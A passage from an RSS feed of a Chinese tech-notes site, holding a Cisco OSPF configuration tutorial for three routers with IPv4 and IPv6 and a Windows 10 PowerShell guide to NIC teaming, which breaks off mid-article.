style="--shiki-light:#50A14F;--shiki-dark:#98C379">   7</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">7=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">49</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1*8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    2</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">8=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   3</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">8=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   4</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">8=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">32</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   5</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">8=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">40</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   6</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">8=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">48</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   7</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">8=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">56</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   8</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">8=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">64</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1*9</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=9</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    2</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">9=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">18</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   3</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">9=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">27</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   4</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">9=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">36</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   5</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">9=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">45</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   6</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">9=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">54</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   7</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">9=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">63</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   8</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">9=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">72</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   9</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">9=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">81</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Cisco路由器OSPF配置</title>
      <link>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E8%B7%AF%E7%94%B1%E5%99%A8OSPF%E9%85%8D%E7%BD%AE.html</link>
      <guid>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E8%B7%AF%E7%94%B1%E5%99%A8OSPF%E9%85%8D%E7%BD%AE.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Cisco路由器OSPF配置</source>
      <description>Cisco路由器OSPF配置 本文档将详细介绍如何配置 OSPF（开放最短路径优先）协议，使用三个路由器：RA、RB 和 RC。一步一步说明每个路由器的配置、设置 IPv4 和 IPv6 地址的、配置OSPF 的启用以及特定接口。 RA 路由器配置 1. 配置接口 为 RA 路由器的接口配置 IP 地址，并确保接口处于启用状态。 2. 配置 OSPF ...</description>
      <pubDate>Sun, 28 Jul 2024 02:04:13 GMT</pubDate>
      <content:encoded><![CDATA[
<p>本文档将详细介绍如何配置 OSPF（开放最短路径优先）协议，使用三个路由器：RA、RB 和 RC。一步一步说明每个路由器的配置、设置 IPv4 和 IPv6 地址的、配置OSPF 的启用以及特定接口。</p>
<h2>RA 路由器配置</h2>
<h3>1. 配置接口</h3>
<p>为 RA 路由器的接口配置 IP 地址，并确保接口处于启用状态。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">enable</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">configure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> terminal</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GigabitEthernet0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 255.255.254.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Serial0/0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.4.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 255.255.255.252</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>2. 配置 OSPF</h3>
<p>配置 OSPF 协议，指定路由器 ID 和网络区域。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">router</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ospf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">router-id</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1.1.1.1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">network</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.0.0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0.0.1.255</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> area</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">passive-interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GigabitEthernet0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">network</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.4.0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0.0.0.3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> area</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>RB 路由器配置</h2>
<h3>1. 配置接口</h3>
<p>RB 路由器的接口配置 IPv4 和 IPv6 地址，配置接口处于启用状态。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">enable</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">configure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> terminal</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> unicast-routing</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Serial0/0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.4.2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 255.255.255.252</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GigabitEthernet0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FE80::1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-local</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.2.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 255.255.254.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ospf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> area</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Serial0/0/1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2001:DB8:2::1/64</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ospf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> area</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>2. 配置 OSPF</h3>
<p>配置 OSPF 协议，指定路由器 ID 和网络区域，同时为 IPv6 配置 OSPF。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">router</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ospf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">router-id</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2.2.2.2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">network</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.4.0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0.0.0.3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> area</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">network</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.2.0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0.0.1.255</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> area</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">passive-interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GigabitEthernet0/0</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> router</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ospf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">router-id</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3.3.3.3</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>RC 路由器配置</h2>
<h3>1. 配置接口</h3>
<p>为 RC 路由器的接口配置 IPv6 地址，配置接口处于启用状态。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">enable</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">configure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> terminal</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GigabitEthernet0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2001:DB8:3::1/64</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FE80::3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-local</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ospf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> area</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Serial0/0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2001:DB8:2::2/64</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ospf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> area</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>2. 配置 OSPF</h3>
<p>启用 IPv6 单播路由并配置 OSPF 协议，指定路由器 ID。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> unicast-routing</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> router</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ospf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">router-id</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3.3.3.3</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>总结</h2>
<p>通过以上配置步骤，为每个路由器配置了 OSPF 协议，支持 IPv4 和 IPv6 路由。每个路由器的接口均已分配相应的 IP 地址，并已启用 OSPF 来支持区域 0 的路由。</p>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>Windows10中用多网卡链路聚合来解决网卡网速瓶颈</title>
      <link>https://www.geekery.cn/note-book/Windows/Windows10%E4%B8%AD%E7%94%A8%E5%A4%9A%E7%BD%91%E5%8D%A1%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88%E6%9D%A5%E8%A7%A3%E5%86%B3%E7%BD%91%E5%8D%A1%E7%BD%91%E9%80%9F%E7%93%B6%E9%A2%88.html</link>
      <guid>https://www.geekery.cn/note-book/Windows/Windows10%E4%B8%AD%E7%94%A8%E5%A4%9A%E7%BD%91%E5%8D%A1%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88%E6%9D%A5%E8%A7%A3%E5%86%B3%E7%BD%91%E5%8D%A1%E7%BD%91%E9%80%9F%E7%93%B6%E9%A2%88.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Windows10中用多网卡链路聚合来解决网卡网速瓶颈</source>
      <description>Windows10中用多网卡链路聚合来解决网卡网速瓶颈 在Windows 10中，可以利用双网卡链路聚合（NIC Teaming）来提升网速解决网卡瓶颈，这篇文章记录了设置链路聚合的方法。 在Windows 10 1809之前版本，可以使用PowerShell 小工具New-NetLbfoTeam 命令来创建网卡组。 在Windows 10 1809之...</description>
      <pubDate>Fri, 26 Jul 2024 08:16:48 GMT</pubDate>
      <content:encoded><![CDATA[
<p>在Windows 10中，可以利用双网卡链路聚合（NIC Teaming）来提升网速解决网卡瓶颈，这篇文章记录了设置链路聚合的方法。</p>
<p>在Windows 10 1809之前版本，可以使用PowerShell 小工具<code>New-NetLbfoTeam</code> 命令来创建网卡组。</p>
<p>在Windows 10 1809之后的版本，这个命令已经不再支持，只能在Windows Server操作系统上使用。我们只能求其次通过<code>New-NetSwitchTeam</code>命令来实现类似的功能。</p>
<h2>Windows 10 1809版本之前</h2>
<h3>配置NIC Teaming</h3>
<h4>启动PowerShell</h4>
<p>打开PowerShell: 在搜索框中输入“PowerShell”，右键点击“Windows PowerShell”，选择“以管理员身份运行”。</p>
<h4>列出网络适配器</h4>
<p>查看网卡：输入以下命令查看计算机上的网络适配器：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Get-NetAdapter</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>记下需要加入网卡组的网卡名称,例如，<code>Ethernet</code> 和 <code>Ethernet 2</code>。</p>
<h4>创建网卡组</h4>
<p>创建网卡组：使用以下命令创建网卡组 Team1：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">New-NetLbfoTeam</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Name </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Team1"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">TeamMembers </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Ethernet"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Ethernet 2"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>如果命令成功执行且没有报错，则表示网卡组创建成功。</p>
<h4><strong>验证网卡组</strong></h4>
<p>验证网卡组：使用以下命令确认网卡组是否创建成功：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Get-NetLbfoTeam</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>如果看到新创建的网卡组信息，则表示配置成功。</p>
<h3>配置网络设置</h3>
<h4>设置静态IP地址</h4>
<p>更改适配器设置：</p>
<ul>
<li>在“网络和共享中心”中，点击左侧的“更改适配器设置”。</li>
</ul>
<p>配置网络桥接：</p>
<ul>
<li>在“网络连接”窗口中，你会看到新创建的网络适配器。</li>
<li>右键点击网络适配器，选择“属性”。</li>
<li>选择“Internet 协议版本 4 (TCP/IPv4)”并点击“属性”。</li>
<li>选择“使用下面的IP地址”。</li>
<li>输入适当的IP地址、子网掩码和默认网关。</li>
<li>点击“确定”，保存设置。</li>
</ul>
<h4>测试和验证</h4>
<p>测试网络连接：</p>
<ul>
<li>打开命令提示符，使用 ping  命令测试网络连通性。例如：</li>
</ul>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">ping </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8.8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8.8</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  # 测试外网连通性</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>带宽测试工具：浏览器访问带宽测试网站 <a href="https://www.speedtest.net" target="_blank" rel="noopener noreferrer">Speedtest</a> 测速</p>
<h3>删除NIC Teaming</h3>
<p>删除网卡组：如果需要删除已创建的网卡组，可以使用以下命令：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Remove-NetLbfoTeam</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Name </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Team1"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>Windows 10 1809版本之后</h2>
<blockquote>
<p>https://blog.csdn.net/ytlzq0228/article/details/118071224</p>
<p>在Windows 10 1809版本之后，<code>New-NetLbfoTeam</code> 方式创建聚合组，LACP功能也被限制。但是依然可以使用NetSwitchTeam创建聚合链路，不过只能使用独立网卡模式，等同于NetLbfoTeam模式里的<code>-teamingMode SwitchIndependent</code></p>
</blockquote>
<p>使用刚才的配置名零会得到下面的报错，解决方法继续看。</p>
